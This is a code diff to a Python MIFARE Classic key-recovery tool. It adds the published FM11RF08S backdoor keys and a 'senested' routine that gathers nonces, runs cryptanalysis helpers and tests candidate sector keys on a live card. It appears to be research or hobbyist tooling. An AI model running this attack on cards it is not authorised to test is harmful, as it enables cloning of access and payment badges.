@@ -159,6 +159,16 @@ HARDNESTED_MAX_RUNS = 200
 HARDNESTED_MAX_ATTEMPTS = 3
 HARDNESTED_TIMEOUT_S = 1800
 
+# Known FM11RF08S "static encrypted" backdoor keys (eprint.iacr.org/2024/1275).
+# These authenticate every sector regardless of the real keys, used to acquire
+# nonces that leak the actual keys via the senested cryptanalysis.
+FM11RF08S_BACKDOOR_KEYS = [
+    bytes.fromhex("A396EFA4E24F"),
+    bytes.fromhex("A31667A8CEC1"),
+    bytes.fromhex("518B3354E760"),
+]
+CHECK_KEYS_BATCH = 83  # firmware limit per mf1_check_keys_on_block call
+
 
 def run_decryptor(name: str, cmd_args: list[str]) -> list[bytes]:
     """Invoke ./bin/<name> and return all 12-hex candidates from stdout."""
@@ -193,6 +203,133 @@ def pick_source_key(known):
         for st_name, st_val in (("A", KEY_A), ("B", KEY_B)):
             if known[s][st_name] is not None:
                 return first_block(s), st_val, known[s][st_name]
+    return None
+
+
+def detect_fm11rf08s(cmd) -> bytes | None:
+    """Try known FM11RF08S backdoor keys against block 0. If one authenticates
+    the card is FM11RF08S and we can use the senested attack. Backdoor keys
+    only auth on this silicon, so the false-positive rate is essentially zero."""
+    for key in FM11RF08S_BACKDOOR_KEYS:
+        if auth(cmd, 0, KEY_A, key) or auth(cmd, 0, KEY_B, key):
+            return key
+    return None
+
+
+def senested_phase(cmd, known, backdoor_key: bytes, out_dir: Path, save=None):
+    """Recover keys via the FM11RF08S backdoor + 1nt static-encrypted attack
+    (eprint.iacr.org/2024/1275). Acquires all 16 sectors' nonces in one shot,
+    then per sector: staticnested_1nt for both A and B candidate dictionaries,
+    staticnested_2x1nt_rf08s to cross-filter, test B candidates on the live
+    card, and (if found) staticnested_2x1nt_rf08s_1key + B key to refine A.
+
+    Note: untested without an FM11RF08S card on hand; faithful port of upstream
+    senested logic. If you hit a real card and something misbehaves, that's
+    where to look first.
+    """
+    print(f"  using backdoor {backdoor_key.hex().upper()}")
+    try:
+        acq = cmd.mf1_static_encrypted_nested_acquire(backdoor_key, SECTOR_COUNT, 0)
+    except Exception as e:
+        print(f"  acquire failed: {e}")
+        return
+    if not acq:
+        print("  acquire returned no data")
+        return
+
+    uid_hex = format(acq["uid"], "08x")
+    scratch = Path(tempfile.mkdtemp(prefix="rf08s_", dir=str(out_dir)))
+    try:
+        for sector in range(SECTOR_COUNT):
+            if known[sector]["A"] is not None and known[sector]["B"] is not None:
+                continue
+            sector_str = f"{sector:02d}"
+            nt_a = format(acq["nts"]["a"][sector]["nt"], "08x")
+            nt_a_enc = format(acq["nts"]["a"][sector]["nt_enc"], "08x")
+            par_a = str(acq["nts"]["a"][sector]["parity"]).zfill(4)
+            nt_b = format(acq["nts"]["b"][sector]["nt"], "08x")
+            nt_b_enc = format(acq["nts"]["b"][sector]["nt_enc"], "08x")
+            par_b = str(acq["nts"]["b"][sector]["parity"]).zfill(4)
+            trailer = sector * 4 + 3
+
+            print(f"  sector {sector:2d}: generating candidate dictionaries...")
+            subprocess.run([str(BIN_DIR / "staticnested_1nt"), uid_hex, sector_str,
+                            nt_a, nt_a_enc, par_a],
+                           cwd=str(scratch), capture_output=True, timeout=60)
+            subprocess.run([str(BIN_DIR / "staticnested_1nt"), uid_hex, sector_str,
+                            nt_b, nt_b_enc, par_b],
+                           cwd=str(scratch), capture_output=True, timeout=60)
+            a_dic = f"keys_{uid_hex}_{sector_str}_{nt_a}.dic"
+            b_dic = f"keys_{uid_hex}_{sector_str}_{nt_b}.dic"
+            subprocess.run([str(BIN_DIR / "staticnested_2x1nt_rf08s"), a_dic, b_dic],
+                           cwd=str(scratch), capture_output=True, timeout=60)
+
+            b_filtered = scratch / b_dic.replace(".dic", "_filtered.dic")
+            if not b_filtered.exists():
+                print(f"  sector {sector:2d}: filtering produced no B candidates")
+                continue
+            b_candidates = [bytes.fromhex(line.strip())
+                            for line in b_filtered.read_text().splitlines()
+                            if re.fullmatch(r"[0-9a-fA-F]{12}", line.strip())]
+
+            b_key = _check_keys_batched(cmd, trailer, KEY_B, b_candidates)
+            if b_key is None:
+                print(f"  sector {sector:2d}: B not in {len(b_candidates)} candidates")
+                continue
+            known[sector]["B"] = b_key
+            print(f"  sector {sector:2d} key B: {b_key.hex().upper()}")
+            if save:
+                save()
+
+            proc = subprocess.run(
+                [str(BIN_DIR / "staticnested_2x1nt_rf08s_1key"),
+                 nt_b, b_key.hex().upper(), a_dic],
+                cwd=str(scratch), capture_output=True, text=True, timeout=60)
+            a_fast = [bytes.fromhex(line.strip())
+                      for line in proc.stdout.splitlines()
+                      if re.fullmatch(r"[0-9a-fA-F]{12}", line.strip())]
+            a_key = _check_keys_batched(cmd, trailer, KEY_A, a_fast) if a_fast else None
+            if a_key is None:
+                a_filtered = scratch / a_dic.replace(".dic", "_filtered.dic")
+                if a_filtered.exists():
+                    a_candidates = [bytes.fromhex(line.strip())
+                                    for line in a_filtered.read_text().splitlines()
+                                    if re.fullmatch(r"[0-9a-fA-F]{12}", line.strip())]
+                    print(f"  sector {sector:2d}: A fast path missed; "
+                          f"checking {len(a_candidates)} filtered A candidates...")
+                    a_key = _check_keys_batched(cmd, trailer, KEY_A, a_candidates)
+            if a_key is None:
+                print(f"  sector {sector:2d}: A not recoverable from candidates")
+                continue
+            known[sector]["A"] = a_key
+            print(f"  sector {sector:2d} key A: {a_key.hex().upper()}")
+            if save:
+                save()
+    finally:
+        for p in scratch.glob("*"):
+            try:
+                p.unlink()
+            except OSError:
+                pass
+        try:
+            scratch.rmdir()
+        except OSError:
+            pass
+
+
+def _check_keys_batched(cmd, block: int, key_type: int, keys: list[bytes]) -> bytes | None:
+    """Try `keys` against the live card via mf1_check_keys_on_block (~33 keys/s),
+    in batches of CHECK_KEYS_BATCH. Returns the first match or None."""
+    for i in range(0, len(keys), CHECK_KEYS_BATCH):
+        batch = keys[i:i + CHECK_KEYS_BATCH]
+        if not batch:
+            continue
+        try:
+            found = cmd.mf1_check_keys_on_block(block, key_type, batch)
+        except Exception:
+            continue
+        if found:
+            return bytes(found)
     return None
 
 
@@ -507,6 +644,12 @@ def main():
         print("  none")
 
     save = lambda: save_keys(uid_int_hex, known, out_dir)
+
+    if any(s[kt] is None for s in known for kt in ("A", "B")):
+        backdoor = detect_fm11rf08s(cmd)
+        if backdoor is not None:
+            print(f"\nFM11RF08S detected (backdoor {backdoor.hex().upper()}). Running senested:")
+            senested_phase(cmd, known, backdoor, out_dir, save=save)
 
     print("\n[1/3] Dictionary attack...")
     dictionary_attack(cmd, dictionary, known, save=save)
